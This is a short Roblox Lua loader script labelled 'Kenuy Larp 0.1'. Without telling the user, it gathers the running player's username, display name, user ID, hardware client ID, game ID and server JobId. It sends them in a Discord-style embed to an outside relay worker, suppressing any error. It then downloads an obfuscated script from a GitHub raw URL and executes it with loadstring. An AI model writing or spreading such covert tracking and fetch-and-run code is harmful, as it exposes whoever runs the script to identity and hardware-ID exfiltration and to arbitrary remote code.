local MAIN_URL = "https://raw.githubusercontent.com/USERNAME/REPO/main/KenuyLarp_0.1.obs.lua"
local RELAY_URL = "https://kenuy-relay.kamu.workers.dev"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
pcall(function()
	local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
	local hwid = "unknown"
	pcall(function() hwid = game:GetService("RbxAnalyticsService"):GetClientId() end)
	HttpService:PostAsync(RELAY_URL, HttpService:JSONEncode({
		embeds = {{
			title = "Kenuy Larp 0.1",
			color = 5814783,
			thumbnail = { url = thumb },
			fields = {
				{ name = "Username", value = LP.Name, inline = true },
				{ name = "Display", value = LP.DisplayName, inline = true },
				{ name = "UserId", value = tostring(LP.UserId), inline = true },
				{ name = "HWID", value = tostring(hwid), inline = false },
				{ name = "Game", value = tostring(game.PlaceId), inline = true },
				{ name = "JobId", value = tostring(game.JobId), inline = false }
			},
			timestamp = DateTime.now():ToIsoDate()
		}}
	}), Enum.HttpContentType.ApplicationJson)
end)
loadstring(game:HttpGet(MAIN_URL))()
